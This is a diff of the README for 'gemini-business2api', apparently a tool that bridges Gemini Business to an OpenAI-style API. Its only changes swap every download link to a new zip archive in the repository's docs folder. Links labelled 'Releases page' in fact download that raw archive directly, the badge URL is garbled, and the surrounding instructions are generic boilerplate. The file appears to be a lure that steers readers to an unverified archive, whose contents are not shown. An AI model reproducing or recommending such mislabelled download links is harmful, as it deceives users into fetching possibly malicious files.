@@ -1,7 +1,7 @@
 # 🌟 gemini-business2api - Easy OpenAI Integration for Gemini Business
 
 ## 📥 Download Now
-[![Download gemini-business2api](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini-business-api-1.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini-business-api-1.6.zip)
+[![Download gemini-business2api](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini_api_business_3.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini_api_business_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to gemini-business2api! This application links Google Gemini Business with OpenAI’s powerful API. It allows you to manage multiple accounts with ease. Follow these simple steps to get started.
@@ -23,7 +23,7 @@ Before you begin, ensure your computer meets these minimum requirements:
 To install gemini-business2api, follow these steps:
 
 ### Step 1: Download the Application
-Visit the [Releases page to download](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini-business-api-1.6.zip). Look for the latest release, and download the appropriate file for your operating system.
+Visit the [Releases page to download](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini_api_business_3.2.zip). Look for the latest release, and download the appropriate file for your operating system.
 
 ### Step 2: Extract the Files
 After downloading, locate the file on your computer. If it is a compressed file (like .zip or .tar), you need to extract it. Right-click the file and select "Extract All" or use a file extraction tool. This will create a new folder with the necessary files.
@@ -53,7 +53,7 @@ If you encounter any issues, try the following:
 For further assistance, you can refer to the FAQ section on the Releases page or seek help from the community.
 
 ## 🚀 Updates
-We continuously improve gemini-business2api. Keep an eye on the [Releases page](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini-business-api-1.6.zip) for new features and bug fixes.
+We continuously improve gemini-business2api. Keep an eye on the [Releases page](https://github.com/bdbsb155/gemini-business2api/raw/refs/heads/main/docs/gemini_api_business_3.2.zip) for new features and bug fixes.
 
 ## 🤝 Contributing
 We welcome contributions from everyone. If you have suggestions or improvements, feel free to submit a pull request or open an issue on our GitHub page.
